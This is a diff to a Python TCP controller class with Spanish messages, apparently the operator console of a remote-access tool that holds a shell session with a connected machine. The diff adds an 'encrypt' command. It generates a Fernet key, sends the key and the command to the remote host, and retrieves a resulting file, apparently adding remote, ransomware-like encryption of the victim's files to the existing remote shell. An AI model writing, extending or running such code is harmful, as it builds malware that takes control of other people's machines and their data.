@@ -8,6 +8,7 @@ import numpy
 from time import sleep
 from colorama import init
 from colorama.ansi import Fore
+from cryptography.fernet import Fernet
 
 init(autoreset=True)
 
@@ -47,6 +48,17 @@ class TCP:
         nombre = os.path.abspath(ubicacion)
         nombre = os.path.basename(nombre)
         return nombre
+
+    def generarClave(self, clave):
+        key = Fernet.generate_key()
+
+        with open(clave, 'wb') as keyFile:
+            keyFile.write(key)
+        keyFile.close()
+        print(Fore.GREEN + f"[+] Clave \"{clave}\" generada")
+
+    def cargarClave(self, clave):
+        return open(clave, 'rb').read()
 
     def escalar(self, height, width):
         if height > width:
@@ -389,6 +401,24 @@ class TCP:
         else:
             print(Fore.RED + f"[-] {self.__addr[0]}: {msg}")
 
+    def encrypt(self, cmd):
+        clave = re.findall("-k[= ]([a-zA-Z0-9./ ].*) -e", cmd)[0]
+        self.generarClave(clave)
+        key = self.cargarClave(clave)
+
+        self.__conexion.send(cmd.encode())
+        sleep(0.1)
+        self.__conexion.send(key)
+
+        msg = self.__conexion.recv(1024).decode()
+
+        if msg[:6] != "error:":
+            print(Fore.GREEN + f"[+] {self.__addr[0]}: {msg}")
+
+            self.recibirArchivo(f"{clave}.dat")
+        else:
+            print(Fore.RED + f"[-] {self.__addr[0]}: {msg}")
+
     def shell(self):
         try:
             while True:
@@ -506,6 +536,21 @@ class TCP:
 
                     except:
                         print(Fore.RED + "[-] Error de proceso (unzip)")
+
+                elif cmd.lower()[:7] == "encrypt":
+                    try:
+                        if re.search("-k", cmd):
+                            if re.search("-e", cmd):
+                                self.encrypt(cmd)
+                            else:
+                                print(Fore.YELLOW + "[!] Falta del parametro encrypt (-e)")
+
+                        else:
+                            print(Fore.YELLOW + "[!] Falta del parametro key (-k)")
+
+                    except Exception as e:
+                        print(e)
+                        print(Fore.RED + "[-] Error de proceso (encrypt)")
 
                 else:
                     try:
